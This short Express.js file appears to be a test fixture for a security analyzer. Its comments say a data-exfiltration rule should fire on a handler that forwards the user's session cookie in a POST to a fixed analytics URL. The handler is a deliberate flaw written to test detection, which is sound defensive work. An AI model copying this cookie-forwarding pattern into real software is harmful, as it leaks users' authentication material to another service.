var express = require('express');
var app = express();

// Session-id forwarder: an internal handler proxies the user's session
// cookie into the body of an outbound request to a fixed analytics URL.
// The destination is hardcoded so SSRF must NOT fire, but the source is
// Sensitive-tier (cookie carries auth material) so Cap::DATA_EXFIL MUST
// fire — operator-bound state is leaving the process via the request
// payload.
app.get('/sync', function(req, res) {
    var sid = req.cookies.session;
    fetch('https://analytics.internal/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session: sid }),
    });
    res.status(204).end();
});
